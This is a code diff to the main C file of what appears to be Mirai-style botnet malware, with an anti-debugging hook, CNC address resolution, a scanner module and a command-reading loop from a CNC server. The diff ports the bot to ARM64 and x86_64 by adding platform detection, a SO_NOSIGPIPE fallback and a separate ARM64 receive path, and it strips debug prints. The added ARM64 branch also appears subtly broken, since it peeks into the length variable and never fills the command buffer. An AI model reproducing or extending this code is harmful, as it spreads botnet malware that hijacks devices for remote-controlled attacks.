@@ -1,6 +1,16 @@
 #define _GNU_SOURCE
 
 #ifdef DEBUG
+
+#if defined(__aarch64__) // Detect ARM64 (aarch64) architecture
+#define PLATFORM "aarch64"
+#elif defined(__x86_64__) // Detect x86_64 architecture
+#define PLATFORM "x86_64"
+#else
+#define PLATFORM "unknown"
+#endif
+
+
 #include <stdio.h>
 #endif
 #include <stdlib.h>
@@ -23,6 +33,9 @@
 #include "scanner.h"
 #include "util.h"
 #include "resolv.h"
+#ifndef SO_NOSIGPIPE
+#define SO_NOSIGPIPE 0 // Define as 0 if not available to avoid compilation issues
+#endif
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -59,6 +72,7 @@ int main(int argc, char **args)
         printf("[main] local ip address (args[2]): %s\n", args[2]);
         printf("[main] callback ip address (args[3]): %s\n", args[3]);
         printf("[main] enable scanner (args[4]): %s\n", args[4]);
+        printf("[main] found platform: %s\n", PLATFORM);
 #endif
     } else {
 #ifdef DEBUG
@@ -338,17 +352,31 @@ int main(int argc, char **args)
                 continue;
             }
             len = ntohs(len);
-            printf("Length: %d\n", len);
             if (len > sizeof (rdbuf))
             {
-                printf("[-] CLOSE the fd_serv");
                 close(fd_serv);
                 fd_serv = -1;
             }
 
+            #if defined(__aarch64__)
+            // aarch64: macOS or Linux ARM behavior
+            static int initialized = 0;
+            if (!initialized)
+            {
+                // Use SO_NOSIGPIPE if available (common on macOS ARM64)
+                int optval = 1;
+                setsockopt(fd_serv, SOL_SOCKET, SO_NOSIGPIPE, &optval, sizeof(optval));
+                initialized = 1;
+            }
+            n = recv(fd_serv, &len, sizeof(len), MSG_PEEK);
+
+
+            #else
             // Try to read in buffer from CNC
             errno = 0;
             n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
+
+            #endif 
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
